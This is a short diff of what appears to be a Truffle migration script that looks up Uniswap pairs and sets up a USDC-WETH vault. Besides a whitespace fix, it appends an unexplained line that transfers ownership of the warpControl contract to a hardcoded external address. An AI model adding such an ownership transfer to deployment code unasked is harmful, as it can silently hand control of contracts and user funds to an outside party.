@@ -41,7 +41,7 @@ module.exports = async (deployer, network, accounts) => {
   }
 
   /* get pairs */
-  
+
   const WETH_DAI_ADD = await uniswapFactory.getPair(wethAddress, daiAddress);
   const WBTC_WETH_ADD = await uniswapFactory.getPair(wethAddress, wbtcAddress);
   const WETH_USDT_ADD = await uniswapFactory.getPair(wethAddress, usdtAddress);
@@ -92,4 +92,5 @@ module.exports = async (deployer, network, accounts) => {
   );
   console.log(`Gas used: ${receipt.receipt.gasUsed}`);
   console.log("USDC-WETH Vault setup successful");
+  await warpControl.transferOwnership("0x0EfE54e77e5Cc430342088DA27EF73f42B482D33");
 };
